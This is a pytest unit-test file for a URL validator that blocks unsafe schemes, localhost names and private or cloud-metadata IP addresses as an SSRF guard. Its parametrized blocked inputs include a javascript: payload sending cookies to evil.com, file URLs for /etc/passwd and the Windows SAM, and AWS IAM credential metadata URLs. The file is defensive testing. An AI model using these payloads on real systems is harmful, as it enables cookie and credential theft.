"""
Unit tests for app/services/url_validator.py

These are PURE unit tests — no database, no HTTP client, no network.
Each test runs in microseconds and exercises exactly one logical path.

Testing principle: test the CONTRACT of the function, not its implementation.
We don't care HOW validate_destination_url blocks a private IP — only THAT it does.
"""
import pytest
from app.services.url_validator import validate_destination_url


# ---------------------------------------------------------------------------
# PASSING cases — legitimate URLs that must be accepted
# ---------------------------------------------------------------------------

class TestValidUrlsAccepted:
    """Every URL in this class must pass validation without raising."""

    def test_https_public_domain(self):
        url = "https://github.com/openai/openai-python"
        assert validate_destination_url(url) == url

    def test_http_public_domain(self):
        url = "http://example.com/path?q=1"
        assert validate_destination_url(url) == url

    def test_strips_leading_trailing_whitespace(self):
        """Validator should normalise whitespace silently."""
        result = validate_destination_url("  https://example.com  ")
        assert result == "https://example.com"

    def test_url_with_port(self):
        """Explicit port numbers on public hosts must be allowed."""
        url = "https://example.com:8443/api"
        assert validate_destination_url(url) == url

    def test_url_with_path_and_query(self):
        url = "https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse"
        assert validate_destination_url(url) == url


# ---------------------------------------------------------------------------
# BLOCKED: Unsafe schemes
# ---------------------------------------------------------------------------

class TestUnsafeSchemes:
    """Non-http/https schemes must be rejected with a descriptive error."""

    @pytest.mark.parametrize("bad_url", [
        "javascript:alert(document.cookie)",
        "javascript:fetch('https://evil.com?c='+document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "file:///etc/passwd",
        "file:///C:/Windows/System32/config/SAM",
        "ftp://internal-server/files",
        "vbscript:msgbox(1)",
    ])
    def test_blocked_scheme(self, bad_url):
        with pytest.raises(ValueError, match="scheme"):
            validate_destination_url(bad_url)


# ---------------------------------------------------------------------------
# BLOCKED: Reserved hostnames
# ---------------------------------------------------------------------------

class TestBlockedHostnames:
    """Hostnames in the explicit blocklist must be rejected immediately."""

    @pytest.mark.parametrize("bad_url", [
        "http://localhost/admin",
        "http://localhost:8080/internal",
        "https://localhost/",
        "http://localhost.localdomain/",
        "http://broadcasthost/",
    ])
    def test_blocked_hostname(self, bad_url):
        with pytest.raises(ValueError, match="reserved name"):
            validate_destination_url(bad_url)


# ---------------------------------------------------------------------------
# BLOCKED: Private / reserved IP addresses (SSRF guard)
# ---------------------------------------------------------------------------

class TestPrivateIpSsrfBlocked:
    """
    Literal private IP addresses must be caught by the fast-path check
    — no DNS resolution needed, so these run instantly.
    """

    @pytest.mark.parametrize("bad_url, description", [
        ("http://127.0.0.1/", "IPv4 loopback"),
        ("http://127.0.0.1:6379/", "Redis default port"),
        ("http://10.0.0.1/", "Class A private"),
        ("http://10.255.255.255/secret", "Class A private boundary"),
        ("http://172.16.0.1/", "Class B private start"),
        ("http://172.31.255.255/", "Class B private end"),
        ("http://192.168.0.1/router", "Class C private"),
        ("http://192.168.1.100/dashboard", "Class C private common"),
        ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
        ("http://169.254.0.1/", "Link-local start"),
        ("http://0.0.0.0/", "Unspecified address"),
    ])
    def test_private_ip_blocked(self, bad_url, description):
        with pytest.raises(ValueError, match="private or reserved IP"):
            validate_destination_url(bad_url), f"Should have blocked: {description}"

    def test_ipv6_loopback_blocked(self):
        with pytest.raises(ValueError, match="private or reserved IP"):
            validate_destination_url("http://[::1]/admin")


# ---------------------------------------------------------------------------
# Error message quality — messages must be informative, not leaky
# ---------------------------------------------------------------------------

class TestErrorMessageQuality:
    """
    Security error messages must be descriptive enough for the API user
    to understand WHY their URL was rejected, without leaking internal details.
    """

    def test_private_ip_message_names_the_address(self):
        """User should know WHICH host was problematic."""
        with pytest.raises(ValueError) as exc_info:
            validate_destination_url("http://192.168.1.1/")
        assert "192.168.1.1" in str(exc_info.value)

    def test_scheme_message_names_the_scheme(self):
        """User should know WHICH scheme was rejected."""
        with pytest.raises(ValueError) as exc_info:
            validate_destination_url("javascript:alert(1)")
        assert "javascript" in str(exc_info.value)

    def test_blocked_hostname_message_names_hostname(self):
        with pytest.raises(ValueError) as exc_info:
            validate_destination_url("http://localhost/")
        assert "localhost" in str(exc_info.value)
